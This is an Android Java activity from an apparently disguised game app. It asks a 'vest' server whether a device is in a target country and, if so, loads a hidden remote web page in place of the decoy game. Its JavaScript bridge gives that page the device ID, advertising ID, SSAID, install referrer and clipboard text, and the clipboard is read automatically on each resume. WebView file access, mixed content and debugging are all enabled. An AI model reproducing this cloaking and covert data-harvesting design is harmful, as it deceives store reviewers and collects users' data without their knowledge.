package com.pbicv.ddpx.game.Tools;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.text.TextUtils;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.JsResult;
import android.webkit.PermissionRequest;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.FrameLayout;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;
import android.widget.TextSwitcher;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ViewSwitcher;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.constraintlayout.widget.ConstraintLayout;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;

import com.android.installreferrer.api.InstallReferrerClient;
import com.blankj.utilcode.util.AppUtils;
import com.blankj.utilcode.util.LogUtils;
import com.blankj.utilcode.util.SPUtils;
import com.blankj.utilcode.util.ToastUtils;
import com.google.android.gms.auth.api.signin.GoogleSignIn;
import com.google.android.gms.auth.api.signin.GoogleSignInAccount;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.messaging.FirebaseMessaging;
import com.just.agentweb.AgentWebConfig;
import com.just.agentweb.WebViewClient;
import com.pbicv.ddpx.MainActivity;
import com.pbicv.ddpx.R;
import com.pbicv.ddpx.game.abstractClass.GLogin;
import com.pbicv.ddpx.game.abstractClass.RxActivity;
import com.pbicv.ddpx.game.network.RetrofitHelper;
import com.pbicv.ddpx.game.pojo.ImportantValue;
import com.pbicv.ddpx.game.pojo.bean.HttpResult;
import com.pbicv.ddpx.util.utils.ConfigFactory;
import com.pbicv.ddpx.util.utils.DeviceUtils;
import com.pbicv.ddpx.util.utils.JVMUtils;
import com.pbicv.ddpx.util.utils.Logger;
import com.pbicv.ddpx.util.utils.TextSwitcherAnimation;


import org.json.JSONException;
import org.json.JSONObject;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers;
import io.reactivex.rxjava3.schedulers.Schedulers;
import kotlin.jvm.internal.Intrinsics;
import ren.yale.android.cachewebviewlib.WebViewCacheInterceptorInst;

public class ClassC extends GLogin {

    private WebView mWebView;

    private RelativeLayout mRootFView;

    private JSONObject mJsonObject = new JSONObject();
    private InstallReferrerClient mInstallReferrerClient;

    private String mJumpReferrerPath = "";

    private static final String TAG = "SplashActivity";
    private final String POST_NOTIFICATIONS = "android.permission.POST_NOTIFICATIONS";

    private final int REQUEST_CODE_OPEN_LOCAL_PIC = 201;


    private ConstraintLayout mClFullLoading;

    private ProgressBar mLoadingProgressBar;
    private TextSwitcher mTextSwitcher;
    private TextSwitcherAnimation mTextSwitcherAnimation;
    List<String> mTextList;

    private boolean mIsWebLoaded; //是否加载完成

    private WebChromeClient mWebChromeClient;
    private WebViewClient mWebViewClient;

    private final JSONObject mNotificationData = new JSONObject();
    private ValueCallback<Uri[]> mValueCallBackonShowFileChooser;
    private WebSettings mWebSettings;
    private int mDescLength = 20;
    private int mNotificationCount = 1;
    @Override
    public void initStyle() {
        initWindow();
        super.initStyle();
    }
    @Override
    public int getLayoutId() {
        return R.layout.gxvkz_b;
    }

    @Override
    public void initViews(Bundle savedInstanceState) {
        loadData();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
    }

    @Override
    protected void onStart() {
        super.onStart();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (mWebView != null) {
            mWebView.onResume();
        }
        //延迟2600ms获取剪切板的内容
        getClipboardTextDelayed();
    }

    @Override
    protected void onPause() {
        super.onPause();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (mWebView != null) {
            mWebView.destroy();
        }
    }

    @Override
    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        boolean z = false;
        LogUtils.dTag(getLocalClassName(), "onKeyDown: ", Integer.valueOf(i), keyEvent);
        if (i != 4) {
            return false;
        }
        WebView webView = this.mWebView;
        if (webView != null && webView.canGoBack()) {
            z = true;
        }
        if (z) {
            WebView webView2 = this.mWebView;
            if (webView2 != null) {
                webView2.goBack();
            }
        } else {
            exit();
        }
        return true;
    }

    private long exitTime;

    private void exit() {
        if ((System.currentTimeMillis() - exitTime) > 2000) {
            ToastUtils.make().setMode(ToastUtils.MODE.DARK).setGravity(Gravity.CENTER, 0, 0).show("Press again to exit");
            exitTime = System.currentTimeMillis();
        } else {
            finish();
            System.exit(0);
        }
    }



    @SuppressLint("CheckResult")
    @Override
    public void loadData() {
        super.loadData();
        init();
        try {
            getBundleJson(getIntent().getExtras());
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }
    private void getBundleJson(Bundle bundle) throws JSONException {
        //Main Activity Key Set
        //Push Notification Key
        if (bundle != null) {
            for (String str : bundle.keySet()) {
                this.mNotificationData.put(str, bundle.get(str));
                LogUtils.dTag(TAG, "mBundleJsonObject" + mNotificationData.toString());
            }
        }
    }
    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        this.setIntent(intent);
    }
    public ClassC() {
        LogUtils.dTag(TAG, "-- SplashActivity Constructor --");
        this.mWebChromeClient = new MyWebChromeClient();
        this.mWebViewClient = new MyWebViewClient();
    }
    private void initWindow() {
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(1024, 1024);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        getWindow().setBackgroundDrawable(null);
        setContentView(R.layout.gxvkz_main);
        getLoadData();
    }
    //存在jsonObject中用于给JS发消息的
    private final void getLoadData() {
        Uri data = getIntent().getData();
        if (data == null) {
            return;
        }
        data.getHost();
        data.getPath();
        data.getQuery();
        String queryParameter = data.getQueryParameter("target");
        String queryParameter2 = data.getQueryParameter("other");
        try {
            this.mJsonObject.put("target", queryParameter);
            this.mJsonObject.put("other", queryParameter2);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    private final ActivityResultLauncher<String> mActivityResultLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestPermission(), isGranted -> {
                if (isGranted) {
                    // FCM SDK (and your app) can post notifications.
                } else {
                    // TODO: Inform user that that your app will not show notifications.
                }
            });


    public final class MyWebViewClient extends WebViewClient {
        MyWebViewClient() {
        }
        @Override
        public void onLoadResource(WebView webView, String str) {
            super.onLoadResource(webView, str);
        }
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
            LogUtils.dTag(TAG, "onPageStarted mUrl:" + url);
        }

        @Override
        public void onPageFinished(WebView webView, String str) {
            super.onPageFinished(webView, str);
            LogUtils.dTag(TAG, "onPageFinished : " + str);
            AgentWebConfig.syncCookie(str, AgentWebConfig.getCookiesByUrl(str));
            if (ClassC.this.mIsWebLoaded) {
                ClassC.this.mIsWebLoaded = false;
                if (ClassC.this.mNotificationData.length() > 0) {
                    ClassC.this.evaluateJavascript(webView, "remoteNotificationCallback", ClassC.this.mNotificationData);
                }
            }
        }

        @Override
        @RequiresApi(api = 21)
        public WebResourceResponse shouldInterceptRequest(WebView webView, WebResourceRequest webResourceRequest) {
            boolean isStartWithUrl;
            String uri = webResourceRequest.getUrl().toString();
            isStartWithUrl = JVMUtils.startWith(uri, "http", false, 2, null);
            LogUtils.dTag(TAG, "shouldInterceptRequest: " + webResourceRequest.getUrl(), new Object[0] + "isStartWithUrl : " + isStartWithUrl);
            if (!isStartWithUrl) {
                //不拦截请求
                return super.shouldInterceptRequest(webView, webResourceRequest);
            }
            //从缓存加载
            return WebViewCacheInterceptorInst.getInstance().interceptRequest(webResourceRequest);
        }

        @Override
        @TargetApi(21)
        public boolean shouldOverrideUrlLoading(WebView webView, WebResourceRequest webResourceRequest) {
            boolean isStartWithUrl;
            ClassC C = ClassC.this;
            LogUtils.dTag(TAG, "shouldOverrideUrlLoading: " + webResourceRequest.getUrl(), new Object[0]);
            String uri = webResourceRequest.getUrl().toString();
            isStartWithUrl = JVMUtils.startWith(uri, ImportantValue.USER_UPLOAD_URL, false, 2, null);
            if (!isStartWithUrl) {
                WebViewCacheInterceptorInst.getInstance().loadUrl(webView, webResourceRequest.getUrl().toString());
                return true;
            }
            return super.shouldOverrideUrlLoading(webView, webResourceRequest);
        }

        @Override
        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
            boolean isStartWithUrl;
            ClassC C = ClassC.this;
            LogUtils.dTag(TAG, "shouldOverrideUrlLoading: " + webView, str);
            isStartWithUrl = JVMUtils.startWith(str, ImportantValue.USER_UPLOAD_URL, false, 2, null);
            if (!isStartWithUrl) {
                WebViewCacheInterceptorInst.getInstance().loadUrl(webView, str);
                return true;
            }
            return super.shouldOverrideUrlLoading(webView, str);
        }
    }


    public class MyWebChromeClient extends WebChromeClient {
        MyWebChromeClient() {
        }
        /* 打开本地图库 */
        public final void openLocalPic() {
            Intent intent = new Intent("android.intent.action.GET_CONTENT");
            intent.addCategory("android.intent.category.OPENABLE");
            intent.setType("*/*");
            ClassC.this.startActivityForResult(Intent.createChooser(intent, "File Browser"), ClassC.this.REQUEST_CODE_OPEN_LOCAL_PIC);
        }

        @Override
        public boolean onJsAlert(WebView webView, String str, String str2, JsResult jsResult) {
            if (str2 != null) {
                Toast.makeText(ClassC.this.getApplicationContext(), str2, Toast.LENGTH_LONG).show();
            }
            if (jsResult != null) {
                jsResult.cancel();
            }
            return true;
        }

        @Override
        @RequiresApi(24)
        public void onPermissionRequest(final PermissionRequest permissionRequest) {
            if (permissionRequest != null) {
                new Handler().post(new Runnable() {
                    @Override
                    public final void run() {
                        permissionRequest.grant(new String[]{"android.webkit.resource.PROTECTED_MEDIA_ID"});
                    }
                });
            }

        }

        @Override
        @RequiresApi(24)
        public void onProgressChanged(WebView webView, int i) {
            LogUtils.dTag(TAG, " web onProgressChanged " + i);
            if (i == 0) {
                ClassC.this.mIsWebLoaded = false;
                startLoopSwitcher();
            } else if (i == 100) {
                ClassC.this.mIsWebLoaded = true;
            }
            super.onProgressChanged(webView, i);
            ClassC.this.onProgressChanged(i);
        }

        @Override
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> valueCallback, FileChooserParams fileChooserParams) {
            ClassC.this.mValueCallBackonShowFileChooser = valueCallback;
            openLocalPic();
            return true;
        }

    }

    public final void onProgressChanged(int i) {
        LogUtils.dTag(TAG, " ProgressBar onProgressChanged " + i);
        if (i == 100) {
            //TODO 上线:需要关闭
            return;
        }
        if (this.mIsWebLoaded) {
            if (mRootFView.getVisibility() == View.VISIBLE) {
                return;
            }
        }
        mTextSwitcher.setVisibility(View.VISIBLE);
        mLoadingProgressBar.setVisibility(View.VISIBLE);
        mLoadingProgressBar.setProgress(((i + 5) * (mLoadingProgressBar.getMax())) / 100);
    }

    private void startLoopSwitcher() {

    }

    private void hideLoading() {
        mClFullLoading.setVisibility(View.GONE);
        mRootFView.setVisibility(View.VISIBLE);
        mLoadingProgressBar.setVisibility(View.GONE);
        mTextSwitcher.setVisibility(View.GONE);
        mTextSwitcherAnimation.stop();
    }



    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        LogUtils.dTag(getLocalClassName(), " onActivityResult : " + requestCode + resultCode + intent);
        //google
        if (requestCode == REQUEST_CODE_GOOGLE_SIGN_LOGIN) {
            Task<GoogleSignInAccount> task = GoogleSignIn.getSignedInAccountFromIntent(intent);
            LogUtils.dTag(getLocalClassName(), " getSignedInAccountFromIntent(data) : " + task);
            //firebase验证google登录并发送给js
            setGoogleSignFirebaseAuthAndSendToJs(this.mWebView, task);
        }
        if (requestCode == 9002 && resultCode == Activity.RESULT_OK) {
            getPhoneNum();
        }

        if (requestCode == 201 || requestCode == 202) {
            onActivityResultForFileChooser(requestCode, resultCode, intent);
        }

    }

    private final void getClipboardTextDelayed() {
        new Handler().postDelayed(new Runnable() {
            @Override // java.lang.Runnable
            public final void run() {
                ClassC.getClipboardText(ClassC.this);
                //TODO 测试通知  2600
//                setNativeNotification("www.baidu.com","title","desc","");
            }
        }, 3600);
    }

    public static final void getClipboardText(ClassC C) {
        Logger logger = Logger.S_MAIN_LOGGER;
        Context applicationContext = C.getApplicationContext();
        C.checkOpenUrl(logger.getClipboardText(applicationContext));
        C.getSourcePath();
    }

    private void checkOpenUrl(String str) {
        boolean z;
        boolean z2;
        if (str.length() == 0) {
            z = true;
        } else {
            z = false;
        }
        if (z) {
            return;
        }
        String sp_jump_referrer_path = getPrefsFileStr(ImportantValue.PACKAGE_NAME + "JUMP_REFERRER_PATH" + ImportantValue.APP_ID, "");
        Logger logger = Logger.S_MAIN_LOGGER;
        logger.logClipBoard("checkOpenUrl start sp_jump_referrer_path", sp_jump_referrer_path);
        logger.logClipBoard("checkOpenUrl start str", str);
        if (sp_jump_referrer_path.length() == 0) {
            z2 = true;
        } else {
            z2 = false;
        }
        if (z2) {
            setSpFileStr(ImportantValue.PACKAGE_NAME + "JUMP_REFERRER_PATH" + ImportantValue.APP_ID, str);
            sp_jump_referrer_path = SPUtils.getInstance(ImportantValue.SP_NAME).getString(ImportantValue.PACKAGE_NAME + "JUMP_REFERRER_PATH" + ImportantValue.APP_ID, "");
            logger.logClipBoard("checkOpenUrl end", sp_jump_referrer_path);
        }
        Intrinsics.checkParameterIsNotNull(sp_jump_referrer_path, "oldJumpUrl");
        this.mJumpReferrerPath = sp_jump_referrer_path;
    }


    public void init() {
        requestServer();
        initFireBaseMessaging();
    }

    private void initFireBaseMessaging() {
        FirebaseMessaging.getInstance().subscribeToTopic(getString(R.string.app_name)).addOnCompleteListener(new OnCompleteListener<Void>() {
            @Override
            public void onComplete(@NonNull Task<Void> task) {
                dealTask(task);
            }
        });

        askNotificationPermission();
    }

    private void dealTask(Task task) {
        String str;
        if (!task.isSuccessful()) {
            str = "Subscribe failed";
        } else {
            str = "Subscribed";
        }
        LogUtils.d("Main", str);
    }

    private void askNotificationPermission() {
        // This is only necessary for API level >= 33 (TIRAMISU)
        if (Build.VERSION.SDK_INT >= 33) {
            if (ContextCompat.checkSelfPermission(this, POST_NOTIFICATIONS) ==
                    PackageManager.PERMISSION_GRANTED) {
                // FCM SDK (and your app) can post notifications.
            } else if (shouldShowRequestPermissionRationale(POST_NOTIFICATIONS)) {
                // TODO: display an educational UI explaining to the user the features that will be enabled
                //       by them granting the POST_NOTIFICATION permission. This UI should provide the user
                //       "OK" and "No thanks" buttons. If the user selects "OK," directly request the permission.
                //       If the user selects "No thanks," allow the user to continue without notifications.
            } else {
                // Directly ask for the permission
                mActivityResultLauncher.launch(POST_NOTIFICATIONS);
            }
        }
    }


    @SuppressLint("CheckResult")
    private void requestServer() {
        // 请求马甲服务器
        //  URL： http://rap2api.taobao.org/app/mock/data/2243559?id=h01_br_a02_002&deviceid=xxxx

/*        响应示例
        {
                "boot": 1, // 1: 打开正式页面，2: 打开假页面
                "isTarget": 1, // IP 判断，0: 非目标国家用户，1: 目标国家用户
                "bucket": 3, // 分桶 ID，用来做网站内部分流测试
                "cleanCache": 2, // 1: 清理 Webview 缓存，2: 不清理 Webview
                "url": "https://h5.pocket-trade.net/" // 分桶后的网站正式地址
        }*/

        String pkgId = DeviceUtils.getPkgIdForUrl();
        String deviceId = DeviceUtils.getUniqueDeviceId();
        //TODO 测试模拟ip
//        String ip = "23.40.252.1";
//        String ip = "";
        LogUtils.dTag(TAG, "pkgId: " + pkgId);
        LogUtils.dTag(TAG, "deviceId: " + deviceId);

        RetrofitHelper.getHostUrlApi(ImportantValue.BASIC_URL).getHostUrl(pkgId, deviceId)
                .compose(((RxActivity) mContext).bindToLifecycle())
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(loginResultDataResponse -> {
                    LogUtils.dTag(TAG, " ---- request HostUrl ----" + loginResultDataResponse);
                    if (loginResultDataResponse.getCode() == 0) {
                        //请求成功
                        LogUtils.dTag(TAG, " ---- request HostUrl success ----");
                        HttpResult httpResult = loginResultDataResponse.getResult();
                        ConfigFactory.getInstance().setLoginResult(httpResult);
                        LogUtils.dTag(TAG, "loginResultDataResponse: " + loginResultDataResponse.toString());
                        //请求失败
                    } else {
                        LogUtils.dTag(" ---- request HostUrl Error ----");
                    }

                    initMainOrGame();

                }, throwable -> {
                    LogUtils.dTag(" ---- request HostUrl Error ----" + throwable.toString());
                    initMainOrGame();
                });

    }

    private void initMainOrGame() {
        HttpResult httpResult = ConfigFactory.getInstance().getLoginResult();
        //TODO 上线:修改
        if (httpResult != null && httpResult.getIsTarget() == 1 && httpResult.getBoot() == 1 && !TextUtils.isEmpty(httpResult.getUrl())) {
            LogUtils.dTag(getLocalClassName(), "- start C Game -");
            //加载h5
            setContentView(R.layout.gxvkz_b);
            //android sdk > 26  初始化通知渠道
            initNotificationChannel(this);
            initMainView();
            initAll(mWebView);
            initJsBridge();

        } else {
            LogUtils.dTag(getLocalClassName(), "- start A Game -");
            startAGame();
        }

    }


    private void startAGame() {
        Intent intent = new Intent(this, MainActivity.class);
        startActivity(intent);
        finish();
    }

    private void initMainView() {

        mRootFView = findViewById(R.id.root_full_view);
        mWebView = findViewById(R.id.full_web_view);
        mClFullLoading = findViewById(R.id.cl_full_Loading);
        mLoadingProgressBar = findViewById(R.id.fullProgressBar);
//        mIvLoading = findViewById(R.id.iv_loading);

        mTextSwitcher = findViewById(R.id.ts_loading);
        mTextList = new ArrayList<>();
        mTextList.add("Maybe a slow start, but an epic journey.");
        mTextList.add("Loading... Brewing up excitement.");
        mTextList.add("Good luck to you!");
        mTextList.add("Joyful hours about to commence.");
        mTextSwitcherAnimation = new TextSwitcherAnimation(mTextSwitcher, mTextList);
        setTextSwitcher();
        initWebView();

    }

    private void setTextSwitcher() {
        mTextSwitcher.setFactory(new ViewSwitcher.ViewFactory() {
            @Override
            public View makeView() {
                TextView textView = new TextView(ClassC.this);
                //文字过长时以省略号的形式显示
//                textView.setEllipsize(TextUtils.TruncateAt.END);
                //设置最多只能显示一行
//                textView.setMaxLines(1);
                textView.setTextSize(14);
//                textView.setTextColor(Color.WHITE);
                textView.setGravity(Gravity.CENTER);
                textView.setTextColor(Color.parseColor("#B72A31"));
                textView.setLayoutParams(new FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.WRAP_CONTENT));
                return textView;
            }
        });
        mTextSwitcherAnimation.create();
    }


    private void initWebView() {

        if (ConfigFactory.getInstance().getLoginResult() != null && ConfigFactory.getInstance().getLoginResult().getCleanCache() == 1) {
            mWebView.clearCache(true);
        }
        initWebViewSetting();
        //真实数据
        mWebView.loadUrl(ConfigFactory.getInstance().getLoginResult().getUrl());
        mWebView.setFitsSystemWindows(true);
    }

    private final void initWebViewSetting() {
        WebView webView = this.mWebView;
        if (webView != null && (mWebSettings = webView.getSettings()) != null) {
            mWebView.setWebChromeClient(this.mWebChromeClient);
            mWebView.setWebViewClient(this.mWebViewClient);
            mWebSettings.setJavaScriptEnabled(true);
            mWebSettings.setBlockNetworkImage(false);
            mWebSettings.setLoadsImagesAutomatically(true);
            mWebSettings.setBuiltInZoomControls(false);
            mWebSettings.setDisplayZoomControls(false);
            mWebSettings.setLoadWithOverviewMode(true);
            mWebSettings.setSupportZoom(false);
            mWebSettings.setUseWideViewPort(true);
            WebView.setWebContentsDebuggingEnabled(true);
            mWebView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
            String m6158X = getCachePath(this); //getWebCachePath
            checkOpenWebCache(getCachePath(this), mWebSettings);
            mWebSettings.setDatabaseEnabled(true);
            mWebSettings.setDatabasePath(m6158X + "/database");
            mWebSettings.setAllowContentAccess(true);
            mWebSettings.setAllowFileAccess(true);
            mWebSettings.setDomStorageEnabled(true);
            mWebSettings.setJavaScriptCanOpenWindowsAutomatically(true);
            mWebSettings.setDefaultTextEncodingName("utf-8");
            mWebSettings.setPluginState(WebSettings.PluginState.ON);
            mWebSettings.setLoadsImagesAutomatically(true);
            mWebSettings.setSavePassword(false);
            mWebSettings.setMediaPlaybackRequiresUserGesture(false);
            mWebSettings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
            CookieManager.getInstance().setAcceptThirdPartyCookies(mWebView, true);
        }
    }


    @SuppressLint({"JavascriptInterface"})
    /* renamed from: W0 */
    private final void initJsBridge() {
        if (mWebView != null) {
            mWebView.addJavascriptInterface(this, "ANDROID_JS_BRIDGE");
        }
    }


    private void initNotificationChannel(Context context) {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel notificationChannel = new NotificationChannel(ImportantValue.APP_ID, ImportantValue.APP_ID, NotificationManager.IMPORTANCE_DEFAULT);
            notificationChannel.setDescription(ImportantValue.APP_ID + "-chanel");
            Object systemService = context.getSystemService(Context.NOTIFICATION_SERVICE);
            ((NotificationManager) systemService).createNotificationChannel(notificationChannel);
        }
    }



    /* ---------------------------------                jsb       start               -------------------------------------*/

    @JavascriptInterface
    public final void getAndroidInfo() {
        LogUtils.dTag("JavascriptObject", "getAndroidInfo start");
        super.getAndroidInfo(this.mWebView);
    }

    @JavascriptInterface
    public final void getAppId() {
        LogUtils.dTag("JavascriptObject", "getAppId start");
        super.getAppId(this.mWebView);
    }

    @JavascriptInterface
    public final void getAppName() {
        LogUtils.dTag("JavascriptObject", "getAppName start");
        super.getAppName(this.mWebView);
    }

    @JavascriptInterface
    public final void getBootAPIData() {
        LogUtils.dTag("JavascriptObject", "getBootAPIData start");
        try {
            evaluateJavascript(this.mWebView, "setBootAPIData", new JSONObject(getPrefsFileStr(AppUtils.getAppPackageName() + "BOOT_OBJ_CACHE" + ImportantValue.APP_ID, "")));
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

    @JavascriptInterface
    public final void getClipboardText() {
        LogUtils.dTag("JavascriptObject", "getClipboardText start");
//        String text = (String) ClipboardUtils.getText();
        String clipboardText = Logger.S_MAIN_LOGGER.getClipboardText(getApplicationContext());
        eval(this.mWebView, "getClipboardTextCallback", "clipboardText", clipboardText);
    }

    @JavascriptInterface
    public final void getDeviceId() {
        LogUtils.dTag("JavascriptObject", "getDeviceId start");
        super.getDeviceId(this.mWebView);
    }

    //获取 Google 广告跟踪 ID
    @JavascriptInterface
    public final void getGaId() {
        LogUtils.dTag("JavascriptObject", "getGaId start");
        super.getGaId(this.mWebView);
    }

    @JavascriptInterface
    public final void getGoogleInstall() {
        LogUtils.dTag("JavascriptObject", "getGoogleInstall start");
        super.getGoogleInstall(this.mWebView);
    }

    @JavascriptInterface
    public final void getGoogleOpen() {
        LogUtils.dTag("JavascriptObject", "getGoogleOpen start");
        LogUtils.dTag("JavascriptObject", "googleLogin", GoogleSignIn.getLastSignedInAccount(this));
        Intent signInIntent = this.mGoogleSignInClient.getSignInIntent();
        Intrinsics.checkParameterIsNotNull(signInIntent, "mGoogleSignInClient.signInIntent");
        startActivityForResult(signInIntent, 9001);
    }

    @JavascriptInterface
    public final void getLoadParamData() {
        LogUtils.dTag("JavascriptObject", "getLoadParamData start");
        getLoadData();
        evaluateJavascript(this.mWebView, "setLoadParamData", this.mJsonObject);
    }

    @JavascriptInterface
    public final void getLoginClose() {
        LogUtils.dTag("JavascriptObject", "getLoginClose start");
        super.getLoginClose(this.mWebView);
    }

    @JavascriptInterface
    public final void getReferrerData() {
        LogUtils.dTag("JavascriptObject", "getReferrerData start");
        eval(this.mWebView, "setReferrerData", "referrer", this.mReferrerDetails);
    }

    @JavascriptInterface
    public final void getSSAID() {
        LogUtils.dTag("JavascriptObject", "getSSAID start");
        super.getSSAID(this.mWebView);
    }

    @JavascriptInterface
    public final void getSourcePath() {
        boolean z;
        LogUtils.dTag("JavascriptObject", "getSourcePath start");
        String str = this.mJumpReferrerPath;
        if (str.length() == 0) {
            z = true;
        } else {
            z = false;
        }
        if (z) {
            str = getPrefsFileStr(ImportantValue.PACKAGE_NAME + "JUMP_REFERRER_PATH" + ImportantValue.APP_ID, "");
        }
        Logger.S_MAIN_LOGGER.logClipBoard("getSourcePath", this.mJumpReferrerPath);
        eval(this.mWebView, "setSourcePath", "sourcePath", str);
    }

    @JavascriptInterface
    public final void openBrowser(String str) {
        try {
            startActivity(new Intent("android.intent.action.VIEW", Uri.parse(str)));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    @JavascriptInterface
    public void openUrlBySystemBrowser(String str) {
        LogUtils.dTag("JavascriptObject", "openUrlBySystemBrowser start");
        super.openUrlBySystemBrowser(str);
    }

    @Override
    @JavascriptInterface
    public void pushCustom(byte[] bArr) {
        LogUtils.dTag("JavascriptObject", "pushCustom start", new String(bArr, StandardCharsets.UTF_8));
        super.pushCustom(bArr);
    }

    @Override
    @JavascriptInterface
    public void pushPurchase(byte[] bArr, byte[] bArr2) {
        LogUtils.dTag("JavascriptObject", "pushPurchase start");
        super.pushPurchase(bArr, bArr2);
    }

    @JavascriptInterface
    public final void setClipboardText(String str) {
        LogUtils.dTag("JavascriptObject", "setClipboardText start");
        Logger logger = Logger.S_MAIN_LOGGER;
        Context applicationContext = getApplicationContext();
        Intrinsics.checkParameterIsNotNull(applicationContext, "applicationContext");
        logger.copyString(applicationContext, str);
    }

    @JavascriptInterface
    public final void setNativeNotification(String jumpPath, String title, String desc, String paramsData) {
        boolean notHaveJumpPath;
        boolean notHaveTitle;
        boolean notHaveDesc = true;
        LogUtils.dTag("JavascriptObject", "setNativeNotification start");
        if (jumpPath.length() == 0) {
            notHaveJumpPath = true;
        } else {
            notHaveJumpPath = false;
        }
        if (!notHaveJumpPath) {
            if (title.length() == 0) {
                notHaveTitle = true;
            } else {
                notHaveTitle = false;
            }
            if (!notHaveTitle) {
                if (desc.length() != 0) {
                    notHaveDesc = false;
                }
                if (!notHaveDesc) {
                    Context applicationContext = getApplicationContext();
                    buildNotification(applicationContext, title, desc, jumpPath, paramsData);
                    evaluateJavascriptState(this.mWebView, "getNativeNotification", "isNotification", Boolean.TRUE);
                    return;
                }
            }
        }
        evaluateJavascriptState(this.mWebView, "getNativeNotification", "isNotification", Boolean.FALSE);
    }


    @JavascriptInterface
    public final void setLoadFinish() {
        LogUtils.dTag("JavascriptObject", "setLoadFinish start");
        hideLoading();
    }


    /* ---------------------------------                jsb     end                 -------------------------------------*/


    private final void buildNotification(Context context, String title, String desc, String jumpPath, String paramsData) {
        String str5;
        int length = desc.length();
        int i = this.mDescLength;
        if (length > i) {
            str5 = desc.substring(0, i);
            Intrinsics.checkParameterIsNotNull(str5, "this as java.lang.String…ing(startIndex, endIndex)");
        } else {
            str5 = desc;
        }
        Notification build = new NotificationCompat.Builder(context, ImportantValue.APP_ID)
                .setStyle(new NotificationCompat.BigTextStyle().bigText(desc))
                .setSmallIcon(R.mipmap.icon).setContentTitle(title)
                .setContentIntent(getPendingIntent(context, title, desc, jumpPath, paramsData))
                .setContentText(str5).setAutoCancel(true)
                .setChannelId(ImportantValue.APP_ID)
                .setPriority(NotificationCompat.PRIORITY_DEFAULT)
                .build();

        NotificationManagerCompat notificationManagerCompat = NotificationManagerCompat.from(context);
        int i2 = this.mNotificationCount + 1;
        this.mNotificationCount = i2;
        notificationManagerCompat.notify(i2, build);
    }


    @SuppressLint("WrongConstant")
    private final PendingIntent getPendingIntent(Context context, String jumpTitle, String jumpDesc, String jumpPath, String jumpParam) {
        getIntent().putExtra("jumpTitle", jumpTitle);
        getIntent().putExtra("jumpDesc", jumpDesc);
        getIntent().putExtra("jumpPath", jumpPath);
        getIntent().putExtra("jumpParam", jumpParam);
        getIntent().addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        double random = Math.random() * 1000000;
        if (Build.VERSION.SDK_INT >= 31) {
            return PendingIntent.getActivity(context, (int) random, getIntent(), PendingIntent.FLAG_MUTABLE);
        }
        return PendingIntent.getActivity(context, (int) random, getIntent(), PendingIntent.FLAG_ONE_SHOT);
    }




}